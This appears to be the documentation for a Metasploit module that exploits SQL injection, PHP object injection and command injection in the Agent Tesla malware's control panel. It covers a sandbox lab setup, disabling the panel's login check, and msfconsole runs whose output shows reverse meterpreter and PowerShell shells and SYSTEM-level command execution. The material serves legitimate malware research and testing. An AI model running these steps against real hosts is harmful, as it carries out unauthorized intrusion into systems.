## Introduction

This module exploit a command injection vulnerability (authenticated and unauthenticated) in the control center of the agent Tesla.

The Unauthenticated RCE is possible by mixing two vulnerabilities (SQLi + PHP Object Injection).

By observing other sources of this panel I found on the Internet to watch the patch, I concluded that the vulnerability was transfomed to an Authenticated RCE.

## Setup

Resources for testing are available here:
<https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources/>

### Windows

For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) (unauthenticated RCE), I used WAMP server 3.1.9 x64 configured with PHP version 5.6.40 (for ioncube compatibility).

For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) (authenticated RCE), I used WAMP server 3.1.9 x64 configured with PHP version 7.2.18 (for ioncube compatibility).

For [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) (authenticated RCE), I used WAMP server 3.1.9 x64 configured with PHP version 7.2.18 (source code is not obfuscated, don't need ioncube).

#### Install WAMP Server 3.2.0

For this, I use a Microsoft Windows 7 x64 as sandboxing system with analysis tools like [FlareVM](https://github.com/fireeye/flare-vm).

You must install simply the latest version of [WAMP Server](https://sourceforge.net/projects/wampserver/files/latest/download) (at this date the used version is 3.2.0).

1. Install `Wamp` using default installer configuration.
2. Start `Wamp` and right click on the icon of started application and ***check*** `Wamp Settings > Allow VirtualHost local IP's others than 127.*`.
3. Allow access to wamp server in local area network.

For the this WAMP Server version:

Edit the `httpd-vhost.conf` file into `c:/wamp64/bin/apache/apache2.4.41/conf/extra/` directory.

Replace the line containig  `Require local` by `Require all granted`.

4. Use the preinstalled `phpmyadmin` of `Wamp` for create a blank database for Agant Tesla web panel.

### Linux

For [WebPanel1.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel1.7z) (unauthenticated RCE), I used a Debian 9 on which I installed PHP version 5.6.40 (for ioncube compatibility).

For [WebPanel2.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel2.7z) (authenticated RCE), I used a Debian 9 on which I installed the default PHP version (for ioncube compatibility).

For [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) (unauthenticated RCE), I used a Debian 9 on which I installed the default PHP version (source code is not obfuscated, don't need ioncube).

#### Install LAMP (Apache, MySQL, PHP)

For this, I use a Linux Debian 9.9.0 (Stretch) x86_x64 as sandboxing system.

1. Install LAMP (Apache, MySQL, PHP).

```bash
sudo apt-get install apache2 apache2-utils mariadb-server mariadb-client ca-certificates apt-transport-https

wget -q https://packages.sury.org/php/apt.gpg -O- | sudo apt-key add -
sudo apt-get update
sudo apt install php5.6 php5.6-cli php5.6-common php5.6-curl php5.6-mbstring php5.6-mysql php5.6-xml libapache2-mod-php5.6 php5.6-json php5.6-opcache php5.6-readline

sudo mysql_secure_installation
```

2. Create a blank database for Agant Tesla web panel.

```
sudo mysql -u root -ppassword

CREATE DATABASE tesla;
CREATE USER 'user' IDENTIFIED BY 'password';
GRANT USAGE ON *.* TO 'user'@localhost IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON `tesla`.* TO 'user'@localhost;
FLUSH PRIVILEGES;
exit
```

### Install Agent Tesla Web panel (simple way)

For this step, you need a functional web environment installed and to have created an empty database (refer to the configuration above).

NOTE: I tracked Agent Tesla panels on the web and I got the sources for these panels by looking for the `WebPanel.zip` file. Some attackers are stupid and leave this file lying around on the server.

The [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) should be used preferably because it is ***not protected*** by `ioncube` and because of this the source code is in clear (but all the other panels are functional with a little more complicated configuration).

I am based on the file creation dates (and diff) to get an idea of ​​the panels evolution, You have more details (in french) on my blog post [Agent Tesla Remote Command Execution (fighting the WebPanel)](https://www.pirates.re/agent-tesla-remote-command-execution-fighting-the-webpanel/).

***IMPORTANT:*** This version of the panel is "by default" patched against unauthenticated RCE. But as I explain in my blog, the patch simply consist adding authentication on the vulnerable page. And that the variables are still not properly sanitized.

To put it simply, with this version of the panel, by default you have an 'Authenticated RCE'.

Now, if you want to "switch" to test simply the `Unauthenticated RCE` with this panel, ***just put the authentication in comment*** on the `WebPanel/server_side/scripts/server_processing.php` page.

As example:

```php
/* // Comment the authentication.
session_start();
  if (!isset($_SESSION['logged_in'])
    || $_SESSION['logged_in'] !== true) {
    header('Location: login.php');
    exit;
  }
*/
```

1. Uncompress the [WebPanel3.7z](https://github.com/mekhalleh/agent_tesla_panel_rce/raw/master/resources/WebPanel3.7z) into your Web directory.
2. Remove the config file `WebPanel/config.php` (it is generated at step 3).
3. Go to: <http://localhost/WebPanel/setup.php>.
4. You can log into Agent Tesla Web panel, all is done.

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS IP`
4. Do: `run`
--or--
1. Start msfconsole
2. Do: `use exploit/multi/http/agent_tesla_panel_rce`
3. Do: `set RHOSTS IP`
4. Do: `set USERNAME REDACTED`
5. Do: `set PASSWORD REDACTED`
5. Do: `run`

## Targets

```
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix (In-Memory)
   2   Windows (In-Memory)
```

## Options

**PASSWORD**

The Agent Tesla CnC password to authenticate with (needed if you attempt an authenticated RCE).

**Proxies**

A proxy chain of format type:host:port[,type:host:port][...]. It's optional.

**RHOSTS**

The target IP address on which the control center responds.

**RPORT**

The target TCP port on which the control center responds. Default: 80

**SSL**

Negotiate SSL/TLS for outgoing connections. Default: false

**TARGETURI**

The base URI path of control center. Default: '/WebPanel'

**USERNAME**

The Agent Tesla CnC username to authenticate with (needed if you attempt an authenticated RCE).

**VHOST**

The target HTTP server virtual host.

## Usage

### Targeting Windows

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set rhosts 192.168.1.21
rhosts => 192.168.1.21
msf5 exploit(multi/http/agent_tesla_panel_rce) > set lhost 192.168.1.13
lhost => 192.168.1.13
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: windows
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .AUKU.php
[*] Sending stage (38247 bytes) to 192.168.1.21
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.21:1036) at 2019-09-04 01:24:12 +0400

meterpreter >
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Sending cmd/windows/reverse_powershell command payload
[*] Command shell session 2 opened (192.168.1.13:4444 -> 192.168.1.21:1040) at 2019-09-04 01:28:55 +0400

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\wamp64\www\WebPanel\server_side\scripts>whoami
nt authority\system

C:\wamp64\www\WebPanel\server_side\scripts>
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 2
target => 2
msf5 exploit(multi/http/agent_tesla_panel_rce) > set payload cmd/windows/generic
payload => cmd/windows/generic
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > set verbose true
verbose => true
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[+] The target appears to be vulnerable.
[*] Sending cmd/windows/generic command payload
[*] Generated command payload: whoami
[!] Dumping command output in parsed json response
nt authority\system
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

### Targeting Linux

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Targeted operating system is: linux
[*] Sending php/meterpreter/reverse_tcp command payload
[*] Payload uploaded as: .WxWf.php
[*] Sending stage (38247 bytes) to 192.168.1.25
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.25:43260) at 2019-09-04 14:44:07 +0400

meterpreter >
```

--or--

```
msf5 exploit(multi/http/agent_tesla_panel_rce) > set target 1
target => 1
msf5 exploit(multi/http/agent_tesla_panel_rce) > set cmd whoami
cmd => whoami
msf5 exploit(multi/http/agent_tesla_panel_rce) > run

[*] Sending cmd/unix/generic command payload
[!] Dumping command output in parsed json response
www-data
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/agent_tesla_panel_rce) >
```

## References

  1. <https://krebsonsecurity.com/2018/10/who-is-agent-tesla/>
  2. <https://github.com/mekhalleh/agent_tesla_panel_rce/tree/master/resources/>
  3. <https://www.exploit-db.com/exploits/47256>
  4. <https://www.pirates.re/agent-tesla-remote-command-execution-(fighting-the-webpanel)>
